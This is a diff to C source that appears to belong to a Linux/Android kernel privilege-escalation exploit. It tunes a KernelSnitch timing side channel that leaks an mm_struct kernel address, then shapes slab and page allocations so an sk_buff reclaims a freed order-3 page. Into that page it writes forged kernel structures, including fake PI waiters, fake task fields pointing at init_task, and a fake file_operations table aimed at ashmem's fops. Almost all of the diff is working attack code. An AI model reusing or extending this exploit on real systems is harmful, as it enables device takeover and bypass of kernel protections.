@@ -11,6 +11,109 @@ static struct mm_ctx pre_ctx;
 static struct mm_ctx post_ctx;
 static pid_t child_leak;
 
+static int rmg_fast_profile_enabled(void) {
+#if defined(APP_DEFAULT_FAST_KSNITCH) && APP_DEFAULT_FAST_KSNITCH
+  return 1;
+#else
+  const char *value = getenv("RMG_FAST");
+  return value && *value && strcmp(value, "0") != 0;
+#endif
+}
+
+static size_t rmg_profile_env_size(const char *name, size_t fallback,
+                                   size_t min, size_t max) {
+  const char *value = getenv(name);
+  if (!value || !*value) {
+    return fallback;
+  }
+
+  char *end = NULL;
+  errno = 0;
+  unsigned long long parsed = strtoull(value, &end, 0);
+  if (errno || end == value || *end || parsed < min || parsed > max) {
+    pr_warning("ignoring invalid %s=%s\n", name, value);
+    return fallback;
+  }
+  return (size_t)parsed;
+}
+
+static void configure_kernelsnitch_profile(
+    struct kernelsnitch_shared_state *state, int payload_mode) {
+  size_t appended_futexes = APPENDED_FUTEXES;
+  size_t repeat_measurement = REPEAT_MEASUREMENT;
+  size_t average = AVERAGE;
+
+#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
+    defined(SLIDE_KSNITCH_APPENDED_FUTEXES)
+  if (payload_mode == PAGE_PAYLOAD_SLIDE) {
+    appended_futexes = SLIDE_KSNITCH_APPENDED_FUTEXES;
+    repeat_measurement = SLIDE_KSNITCH_REPEAT_MEASUREMENT;
+    average = SLIDE_KSNITCH_AVERAGE;
+  }
+
+  /*
+   * Collision measurement dominates the wall time on E2S.  FAST keeps the
+   * collision count, confirmation count and exact address search unchanged;
+   * it only uses the shorter measurement profile already proven by the slide
+   * consumer.  Explicit variables make hardware A/B testing possible without
+   * producing a new payload for every sample count.
+   */
+  if (rmg_fast_profile_enabled()) {
+    appended_futexes = SLIDE_KSNITCH_APPENDED_FUTEXES;
+    if (repeat_measurement > 32) {
+      repeat_measurement = 32;
+    }
+    if (average > 4) {
+      average = 4;
+    }
+  }
+#endif
+
+  appended_futexes = rmg_profile_env_size(
+      "RMG_KSNITCH_APPENDED", appended_futexes, 256, 4096);
+  repeat_measurement = rmg_profile_env_size(
+      "RMG_KSNITCH_REPEAT", repeat_measurement, 8, REPEAT_MEASUREMENT);
+  average = rmg_profile_env_size(
+      "RMG_KSNITCH_AVERAGE", average, 1, repeat_measurement);
+  if (average > repeat_measurement) {
+    average = repeat_measurement;
+  }
+
+  kernelsnitch_set_profile(state, appended_futexes, repeat_measurement,
+                           average);
+  pr_info("KernelSnitch profile mode=%d fast=%d appended=%zu repeat=%zu "
+          "average=%zu\n",
+          payload_mode, rmg_fast_profile_enabled(), appended_futexes,
+          repeat_measurement, average);
+}
+
+static void log_mm_slabinfo(const char *stage) {
+  if (!getenv("SLUB_DIAG")) {
+    return;
+  }
+
+  FILE *fp = fopen("/proc/slabinfo", "re");
+  if (!fp) {
+    pr_warning("mm slabinfo stage=%s open errno=%d\n", stage, errno);
+    return;
+  }
+
+  char line[512];
+  int found = 0;
+  while (fgets(line, sizeof(line), fp)) {
+    if (strncmp(line, "mm_struct ", strlen("mm_struct ")) != 0) {
+      continue;
+    }
+    pr_info("mm slabinfo stage=%s %s", stage, line);
+    found = 1;
+    break;
+  }
+  fclose(fp);
+  if (!found) {
+    pr_warning("mm slabinfo stage=%s entry missing\n", stage);
+  }
+}
+
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && \
     defined(SLIDE_P0_OFFSET_CANDIDATES)
 static const uintptr_t slide_bank_offsets[] = {
@@ -30,6 +133,11 @@ _Static_assert(
             SLIDE_BANK_WAITER_OFF + FAKE_WAITER_LAYOUT_SIZE <=
         ORDER3_SIZE,
     "slide lock bank exceeds reclaimed page");
+#if defined(APP_FOPS_TABLE_MIRROR_OFF)
+_Static_assert(
+    APP_FOPS_TABLE_MIRROR_OFF + 0x110 <= FOPS_TABLE_OFF,
+    "mirrored FOPS table overlaps primary FOPS table");
+#endif
 #endif
 
 uintptr_t page_base;
@@ -46,6 +154,9 @@ uintptr_t slide_oracle_parent;
 uintptr_t slide_oracle_target;
 uintptr_t p0_gate_page_struct;
 uintptr_t p0_probe_page_struct;
+uintptr_t fops_data_probe_addr;
+int fops_data_probe_active;
+int data_alias_uses_slide = 1;
 char ashmem_path[256] = "/dev/ashmem";
 
 static void put_fake_waiter(unsigned char *payload, size_t waiter_off,
@@ -131,23 +242,54 @@ static void put_slide_bank_entry(unsigned char *p, uintptr_t payload_base,
   uintptr_t task = payload_base + task_off;
   uintptr_t lock = payload_base + lock_off;
   uintptr_t waiter = payload_base + waiter_off;
+  uintptr_t pi_right = 0;
+  uintptr_t pi_left = target;
+  uintptr_t lock_owner = SLIDE_LOCK_OWNER_VALUE;
+  uintptr_t waiter_task = task;
+  uintptr_t task_group = 0;
+  uintptr_t pi_waiters = waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF;
+  uintptr_t pi_top_task = task;
+  uint32_t waiter_prio = SLIDE_FAKE_WAITER_PRIO;
+
+#if defined(P0_ORACLE_PRODUCTION_SLOT)
+  if (slot == P0_ORACLE_PRODUCTION_SLOT) {
+#if defined(APP_PRODUCTION_SLOT_PI_RIGHT) && \
+    APP_PRODUCTION_SLOT_PI_RIGHT
+    pi_right = target;
+    pi_left = 0;
+#elif defined(APP_PRODUCTION_SLOT_PROVEN_LEFT) && \
+    APP_PRODUCTION_SLOT_PROVEN_LEFT
+    /* Use the child direction proven by the exact gate/probe/restore writes. */
+    pi_right = 0;
+    pi_left = target;
+#endif
+#if defined(APP_PRODUCTION_SLOT_FULL_FOPS_GEOMETRY) && \
+    APP_PRODUCTION_SLOT_FULL_FOPS_GEOMETRY
+    /* Match the established non-banked PAGE_PAYLOAD_FOPS construction. */
+    lock_owner = task | 1;
+    waiter_task = text_addr(INIT_TASK);
+    task_group = text_addr(ROOT_TASK_GROUP);
+    pi_waiters = 0;
+    pi_top_task = text_addr(INIT_TASK);
+    waiter_prio = FAKE_WAITER_PRIO;
+#endif
+  }
+#endif
 
   put32(p, lock_off + 0x00, 0);
   put64(p, lock_off + 0x08, waiter);
   put64(p, lock_off + 0x10, waiter);
-  put64(p, lock_off + 0x18, SLIDE_LOCK_OWNER_VALUE);
-  put_fake_waiter(p, waiter_off, 1, 0, 0, parent, 0, target, task, lock,
-                  SLIDE_FAKE_WAITER_PRIO);
+  put64(p, lock_off + 0x18, lock_owner);
+  put_fake_waiter(p, waiter_off, 1, 0, 0, parent, pi_right, pi_left,
+                  waiter_task, lock, waiter_prio);
   put32(p, task_off + FAKE_TASK_USAGE_OFF, 0x100);
   put32(p, task_off + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
   put32(p, task_off + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
-  put64(p, task_off + FAKE_TASK_TASK_GROUP_OFF, 0);
+  put64(p, task_off + FAKE_TASK_TASK_GROUP_OFF, task_group);
   put32(p, task_off + FAKE_TASK_PI_LOCK_OFF, 0);
-  put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF,
-        waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF);
-  put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF + 0x08,
-        waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF);
-  put64(p, task_off + FAKE_TASK_PI_TOP_TASK_OFF, task);
+  put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF, pi_waiters);
+  put64(p, task_off + FAKE_TASK_PI_WAITERS_OFF + 0x08, pi_waiters);
+  put64(p, task_off + FAKE_TASK_PI_TOP_TASK_OFF, pi_top_task);
   put64(p, task_off + FAKE_TASK_PI_BLOCKED_ON_OFF, 0);
 }
 #endif
@@ -155,13 +297,9 @@ static void put_slide_bank_entry(unsigned char *p, uintptr_t payload_base,
 void setup_kernelsnitch(void) {
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   ks = kernelsnitch_setup(
-      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
-#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
-  kernelsnitch_set_profile(
-      ks, SLIDE_KSNITCH_APPENDED_FUTEXES,
-      SLIDE_KSNITCH_REPEAT_MEASUREMENT,
-      SLIDE_KSNITCH_AVERAGE);
-#endif
+      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
+      KERNELSNITCH_VERBOSE, KERNELSNITCH_MTE_ENABLED);
+  configure_kernelsnitch_profile(ks, PAGE_PAYLOAD_SLIDE);
 }
 
 int kernelsnitch_collisions_ready(void) {
@@ -172,10 +310,22 @@ void run_kernelsnitch_bruteforce(void) {
   kernelsnitch_bruteforce(ks);
 }
 
+static uintptr_t canonicalize_kernelsnitch_pointer(uintptr_t leaked) {
+#if KERNELSNITCH_MTE_ENABLED
+  if (leaked != (uintptr_t)-1) {
+    uintptr_t tagged = leaked;
+    leaked |= 0xff00000000000000ULL;
+    pr_info("KernelSnitch mm_struct tagged=%016zx untagged=%016zx\n",
+            tagged, leaked);
+  }
+#endif
+  return leaked;
+}
+
 uintptr_t cleanup_kernelsnitch(void) {
   uintptr_t leaked = kernelsnitch_cleanup(ks);
   ks = NULL;
-  return leaked;
+  return canonicalize_kernelsnitch_pointer(leaked);
 }
 
 void read_first_line(const char *path, char *buf, size_t len) {
@@ -349,7 +499,8 @@ uintptr_t p0_alias_image_offset(uintptr_t data_alias) {
 }
 
 uintptr_t data_addr(uintptr_t image_addr) {
-  return p0_data_alias(image_addr) + slide_p0_offset;
+  uintptr_t address = p0_data_alias(image_addr);
+  return data_alias_uses_slide ? address + slide_p0_offset : address;
 }
 
 uintptr_t kaslr_image_addr(uintptr_t image_addr) {
@@ -635,8 +786,49 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
   if (payload_mode == PAGE_PAYLOAD_FOPS) {
     slide_bank_payload_base = payload_base;
+#if defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY
+    p0_gate_page_struct = direct_to_page(base);
+    slide_bank_parents[P0_ORACLE_GATE_SLOT] = p0_gate_page_struct;
+    slide_bank_targets[P0_ORACLE_GATE_SLOT] =
+        pipebuf_page_base +
+        P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
+    slide_bank_parents[P0_ORACLE_PROBE_SLOT] = p0_gate_page_struct;
+    slide_bank_targets[P0_ORACLE_PROBE_SLOT] = 0;
+#elif defined(APP_FOPS_DATA_ALIAS_DIAG_ONLY) && \
+    APP_FOPS_DATA_ALIAS_DIAG_ONLY
+    if (fops_data_probe_active) {
+      p0_gate_page_struct = direct_to_page(base);
+      p0_probe_page_struct =
+          direct_to_page(fops_data_probe_addr & ~(PAGE_SIZE - 1));
+      slide_bank_parents[P0_ORACLE_GATE_SLOT] = p0_gate_page_struct;
+      slide_bank_targets[P0_ORACLE_GATE_SLOT] =
+          pipebuf_page_base +
+          P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE;
+      slide_bank_parents[P0_ORACLE_PROBE_SLOT] = p0_probe_page_struct;
+      slide_bank_targets[P0_ORACLE_PROBE_SLOT] =
+          pipebuf_page_base +
+          P0_ORACLE_GATE_OBJECT_INDEX * PIPE_OBJECT_SIZE +
+          sizeof(struct user_pipe_buffer);
+      slide_bank_parents[P0_ORACLE_GATE_RESTORE_SLOT] =
+          p0_gate_page_struct;
+      slide_bank_targets[P0_ORACLE_GATE_RESTORE_SLOT] = 0;
+      slide_bank_parents[P0_ORACLE_PROBE_RESTORE_SLOT] =
+          p0_probe_page_struct;
+      slide_bank_targets[P0_ORACLE_PROBE_RESTORE_SLOT] = 0;
+#if defined(APP_FOPS_REUSE_VERIFIED_PAGE) && \
+    APP_FOPS_REUSE_VERIFIED_PAGE
+      slide_bank_parents[P0_ORACLE_PRODUCTION_SLOT] = fake_fops;
+      slide_bank_targets[P0_ORACLE_PRODUCTION_SLOT] =
+          data_addr(ASHMEM_MISC_FOPS);
+#endif
+    } else {
+      slide_bank_parents[0] = fake_fops;
+      slide_bank_targets[0] = data_addr(ASHMEM_MISC_FOPS);
+    }
+#else
     slide_bank_parents[0] = fake_fops;
     slide_bank_targets[0] = data_addr(ASHMEM_MISC_FOPS);
+#endif
   }
 #endif
   if (payload_mode == PAGE_PAYLOAD_FOPS) {
@@ -731,10 +923,47 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 
     if (payload_mode == PAGE_PAYLOAD_FOPS) {
       put_fake_fops_table(p, FOPS_TABLE_OFF);
+#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
+    defined(APP_FOPS_TABLE_MIRROR_OFF)
+      /*
+       * Hardware reads the marker emitted at payload offset 0xe80 at page
+       * offset zero, while the stable PI geometry deliberately addresses the
+       * reclaimed payload with SKB_DATA_DELTA=-0x1000.  Keep that proven
+       * geometry and mirror only the file_operations bytes across the 0x180
+       * gap.  The primary copy remains for the page-aligned interpretation.
+       */
+      put_fake_fops_table(p, APP_FOPS_TABLE_MIRROR_OFF);
+#endif
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+#if defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY
+      memcpy(p + P0_ORACLE_GATE_PAGE_OFF, "RMG-P0-ORACLE-GATE", 18);
+      put_slide_bank_entry(
+          p, payload_base, P0_ORACLE_GATE_SLOT,
+          slide_bank_parents[P0_ORACLE_GATE_SLOT],
+          slide_bank_targets[P0_ORACLE_GATE_SLOT]);
+      put_slide_bank_entry(
+          p, payload_base, P0_ORACLE_PROBE_SLOT,
+          slide_bank_parents[P0_ORACLE_PROBE_SLOT],
+          slide_bank_targets[P0_ORACLE_PROBE_SLOT]);
+#elif defined(APP_FOPS_DATA_ALIAS_DIAG_ONLY) && \
+    APP_FOPS_DATA_ALIAS_DIAG_ONLY
+      if (fops_data_probe_active) {
+        memcpy(p + P0_ORACLE_GATE_PAGE_OFF, "RMG-P0-ORACLE-GATE", 18);
+        for (size_t slot = 0; slot < SLIDE_BANK_SLOTS; slot++) {
+          put_slide_bank_entry(p, payload_base, slot,
+                               slide_bank_parents[slot],
+                               slide_bank_targets[slot]);
+        }
+      } else {
+        put_slide_bank_entry(p, payload_base, 0,
+                             slide_bank_parents[0],
+                             slide_bank_targets[0]);
+      }
+#else
       put_slide_bank_entry(p, payload_base, 0,
                            slide_bank_parents[0],
                            slide_bank_targets[0]);
+#endif
 #endif
     }
   }
@@ -743,6 +972,7 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
 
 uintptr_t prepare_kernel_page(int payload_mode) {
   close_reclaim_sockets();
+  cleanup_page_prepare_state();
   mm_objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
   prepare_ctxs();
 
@@ -763,16 +993,24 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   ks = kernelsnitch_setup(
-      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS, 0, 0);
+      MM_STRUCT_SZ, MM_ORDER, cpu_count, KSNITCH_COLLISIONS,
+      KERNELSNITCH_VERBOSE, KERNELSNITCH_MTE_ENABLED);
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && \
-    defined(SLIDE_KSNITCH_APPENDED_FUTEXES)
+    defined(APP_KERNEL_PAGE_KSNITCH_IDENTITY_END) && \
+    defined(APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION)
+  size_t search_min_object_index = APP_FOPS_MIN_OBJECT_INDEX;
+  size_t search_max_object_index = mm_objs_per_slab - 1;
   if (payload_mode == PAGE_PAYLOAD_SLIDE) {
-    kernelsnitch_set_profile(
-        ks, SLIDE_KSNITCH_APPENDED_FUTEXES,
-        SLIDE_KSNITCH_REPEAT_MEASUREMENT,
-        SLIDE_KSNITCH_AVERAGE);
+    search_min_object_index = APP_SLIDE_MIN_OBJECT_INDEX;
+    search_max_object_index = APP_SLIDE_MAX_OBJECT_INDEX;
   }
+  kernelsnitch_set_search_bounds(
+      ks, KERNELSNITCH_IDENTITY_START,
+      APP_KERNEL_PAGE_KSNITCH_IDENTITY_END,
+      search_min_object_index, search_max_object_index,
+      APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION);
 #endif
+  configure_kernelsnitch_profile(ks, payload_mode);
 
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
     pre_ctx.childs[i] = clone_child();
@@ -800,6 +1038,7 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     kill_child(spray_ctx.childs[i]);
   }
   SYSCHK(waitpid(child_leak, NULL, 0));
+  log_mm_slabinfo("after-child-exit");
 
   if (!kernelsnitch_found_collisions(ks)) {
     pr_warning("KernelSnitch collision finding failed\n");
@@ -824,10 +1063,73 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     cleanup_page_prepare_state();
     return 0;
   }
+  leaked = canonicalize_kernelsnitch_pointer(leaked);
+  log_mm_slabinfo("after-leak");
 
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
+  size_t object_index = (leaked - base) / MM_STRUCT_SZ;
   pr_info("mm leaked=%016zx base=%016zx object_index=%zu\n",
-          leaked, base, (leaked - base) / MM_STRUCT_SZ);
+          leaked, base, object_index);
+#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
+    defined(APP_RECLAIM_MAX_DIRECT_BASE)
+  if (base >= APP_RECLAIM_MAX_DIRECT_BASE) {
+    pr_warning("mm reclaim candidate rejected mode=%d base=%016zx max=%016llx\n",
+               payload_mode, base,
+               (unsigned long long)APP_RECLAIM_MAX_DIRECT_BASE);
+    kernelsnitch_cleanup(ks);
+    ks = NULL;
+    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+      kill_child(prepare_ctx.childs[i]);
+    }
+    cleanup_page_prepare_state();
+    return 0;
+  }
+#endif
+#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
+    defined(APP_SLIDE_MIN_OBJECT_INDEX)
+  if (payload_mode == PAGE_PAYLOAD_SLIDE &&
+      object_index < APP_SLIDE_MIN_OBJECT_INDEX) {
+    pr_warning("mm slide candidate rejected object_index=%zu min=%d\n",
+               object_index, APP_SLIDE_MIN_OBJECT_INDEX);
+    kernelsnitch_cleanup(ks);
+    ks = NULL;
+    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+      kill_child(prepare_ctx.childs[i]);
+    }
+    cleanup_page_prepare_state();
+    return 0;
+  }
+#endif
+#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
+    defined(APP_SLIDE_MAX_OBJECT_INDEX)
+  if (payload_mode == PAGE_PAYLOAD_SLIDE &&
+      object_index > APP_SLIDE_MAX_OBJECT_INDEX) {
+    pr_warning("mm slide candidate rejected object_index=%zu max=%d\n",
+               object_index, APP_SLIDE_MAX_OBJECT_INDEX);
+    kernelsnitch_cleanup(ks);
+    ks = NULL;
+    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+      kill_child(prepare_ctx.childs[i]);
+    }
+    cleanup_page_prepare_state();
+    return 0;
+  }
+#endif
+#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
+    defined(APP_FOPS_MIN_OBJECT_INDEX)
+  if (payload_mode == PAGE_PAYLOAD_FOPS &&
+      object_index < APP_FOPS_MIN_OBJECT_INDEX) {
+    pr_warning("mm fops candidate rejected object_index=%zu min=%d\n",
+               object_index, APP_FOPS_MIN_OBJECT_INDEX);
+    kernelsnitch_cleanup(ks);
+    ks = NULL;
+    for (size_t i = 0; i < prepare_ctx.mm_cnt; i++) {
+      kill_child(prepare_ctx.childs[i]);
+    }
+    cleanup_page_prepare_state();
+    return 0;
+  }
+#endif
   if (!prepare_skb_payload(base, payload_mode)) {
     kernelsnitch_cleanup(ks);
     ks = NULL;
@@ -839,8 +1141,27 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   }
 
   SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, reclaim_sv));
+#ifdef APP_SLIDE_RECLAIM_SNDBUF
+  int sndbuf = APP_SLIDE_RECLAIM_SNDBUF;
+#else
   int sndbuf = 1 << 20;
-  setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));
+#endif
+  errno = 0;
+  int sndbuf_set_ret =
+      setsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf,
+                 sizeof(sndbuf));
+  int sndbuf_set_errno = errno;
+  socklen_t sndbuf_len = sizeof(sndbuf);
+  int sndbuf_effective = 0;
+  errno = 0;
+  int sndbuf_get_ret =
+      getsockopt(reclaim_sv[0], SOL_SOCKET, SO_SNDBUF, &sndbuf_effective,
+                 &sndbuf_len);
+  int sndbuf_get_errno = errno;
+  pr_info("sk_buff reclaim sndbuf request=%d effective=%d "
+          "set_ret=%d set_errno=%d get_ret=%d get_errno=%d\n",
+          sndbuf, sndbuf_effective, sndbuf_set_ret, sndbuf_set_errno,
+          sndbuf_get_ret, sndbuf_get_errno);
   int reclaim_flags = fcntl(reclaim_sv[0], F_GETFL, 0);
   if (reclaim_flags >= 0) {
     fcntl(reclaim_sv[0], F_SETFL, reclaim_flags | O_NONBLOCK);
@@ -859,6 +1180,15 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   msg.msg_iovlen = 1;
 
   SYSCHK(sendmsg(pcp_shaping_sv[0], &msg, 0));
+#if defined(APP_QUIET_RECLAIM_WINDOW) && APP_QUIET_RECLAIM_WINDOW
+  /*
+   * Make the target-release-to-skb-reclaim interval free of stdio flushes.
+   * stdout is a regular-file stream under the payload runner, so an otherwise
+   * harmless diagnostic can cross its buffer boundary at a nondeterministic
+   * point and allocate while the order-3 page is briefly in the buddy.
+   */
+  SYSCHK(fflush(NULL));
+#endif
 
   pin_to_core(CORE);
   sched_yield();
@@ -874,7 +1204,9 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   pre_ctx.memfds[target_pre] = -1;
   SYSCHK(close(post_ctx.memfds[0]));
   post_ctx.memfds[0] = -1;
+#if !(defined(APP_QUIET_RECLAIM_WINDOW) && APP_QUIET_RECLAIM_WINDOW)
   pr_info("mm target-neighbor slab queued for late drain\n");
+#endif
   for (size_t i = 0; i < target_pre; i++) {
     SYSCHK(close(pre_ctx.memfds[i]));
     pre_ctx.memfds[i] = -1;
@@ -883,6 +1215,9 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     SYSCHK(close(post_ctx.memfds[i]));
     post_ctx.memfds[i] = -1;
   }
+#if !(defined(APP_QUIET_RECLAIM_WINDOW) && APP_QUIET_RECLAIM_WINDOW)
+  log_mm_slabinfo("after-target-neighbors");
+#endif
 
   SYSCHK(close(pcp_shaping_sv[0]));
   SYSCHK(close(pcp_shaping_sv[1]));
@@ -893,29 +1228,79 @@ uintptr_t prepare_kernel_page(int payload_mode) {
   SYSCHK(close(memfd_leak));
   memfd_leak = -1;
   size_t drain_triggers = prepare_ctx.mm_cnt / mm_objs_per_slab;
+#ifdef APP_MM_LATE_DRAIN_TRIGGERS
+  drain_triggers = APP_MM_LATE_DRAIN_TRIGGERS;
+#endif
+  pid_t deferred_reap_children[drain_triggers ? drain_triggers : 1];
+  size_t deferred_reap_count = 0;
+  memset(deferred_reap_children, 0, sizeof(deferred_reap_children));
   for (size_t i = 0; i < drain_triggers; i++) {
     size_t index = i * mm_objs_per_slab;
     SYSCHK(close(prepare_ctx.memfds[index]));
     prepare_ctx.memfds[index] = -1;
+#if (defined(APP_DEFER_ALL_DRAIN_REAPS) && \
+     APP_DEFER_ALL_DRAIN_REAPS) || \
+    (defined(APP_DEFER_FINAL_DRAIN_REAP) && \
+     APP_DEFER_FINAL_DRAIN_REAP)
+    int defer_reap = 0;
+#if defined(APP_DEFER_ALL_DRAIN_REAPS) && APP_DEFER_ALL_DRAIN_REAPS
+    defer_reap = 1;
+#elif defined(APP_DEFER_FINAL_DRAIN_REAP) && APP_DEFER_FINAL_DRAIN_REAP
+    defer_reap = i + 1 == drain_triggers;
+#endif
+    if (defer_reap) {
+      pid_t child = prepare_ctx.childs[index];
+      SYSCHK(kill(child, SIGKILL));
+      siginfo_t child_info;
+      memset(&child_info, 0, sizeof(child_info));
+      int wait_ret;
+      do {
+        wait_ret = waitid(P_PID, child, &child_info,
+                          WEXITED | WNOWAIT);
+      } while (wait_ret < 0 && errno == EINTR);
+      SYSCHK(wait_ret);
+      deferred_reap_children[deferred_reap_count++] = child;
+      prepare_ctx.childs[index] = -1;
+#if !(defined(APP_QUIET_RECLAIM_WINDOW) && APP_QUIET_RECLAIM_WINDOW)
+      pr_info("mm drain child exited deferred-reap trigger=%zu/%zu pid=%d "
+              "code=%d status=%d\n",
+              i + 1, drain_triggers, child, child_info.si_code,
+              child_info.si_status);
+#endif
+      continue;
+    }
+#endif
     kill_child(prepare_ctx.childs[index]);
     prepare_ctx.childs[index] = -1;
   }
-  pr_info("mm late cpu-partial drain triggers=%zu\n", drain_triggers);
   int reclaim_sends = SKB_RECLAIM_SENDS;
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
   reclaim_sends = APP_SLIDE_RECLAIM_SENDS;
 #endif
   int reclaim_sent = 0;
+  int reclaim_errno = 0;
   for (int i = 0; i < reclaim_sends; i++) {
     errno = 0;
     ssize_t sent = sendmsg(reclaim_sv[0], &msg, MSG_DONTWAIT);
     if (sent <= 0) {
+      reclaim_errno = errno;
       break;
     }
     reclaim_sent++;
   }
-  pr_info("sk_buff reclaim sends=%d/%d mode=%d\n",
-          reclaim_sent, reclaim_sends, payload_mode);
+  for (size_t i = 0; i < deferred_reap_count; i++) {
+    SYSCHK(waitpid(deferred_reap_children[i], NULL, 0));
+    pr_info("mm drain child reaped after reclaim index=%zu/%zu pid=%d\n",
+            i + 1, deferred_reap_count, deferred_reap_children[i]);
+  }
+#if defined(APP_QUIET_RECLAIM_WINDOW) && APP_QUIET_RECLAIM_WINDOW
+  pr_info("mm quiet reclaim window completed deferred-exits=%zu\n",
+          deferred_reap_count);
+#endif
+  pr_info("mm late cpu-partial drain triggers=%zu\n", drain_triggers);
+  pr_info("sk_buff reclaim sends=%d/%d mode=%d stop_errno=%d\n",
+          reclaim_sent, reclaim_sends, payload_mode, reclaim_errno);
+  log_mm_slabinfo("after-exact-drain-reclaim");
   kernelsnitch_cleanup(ks);
   ks = NULL;
 
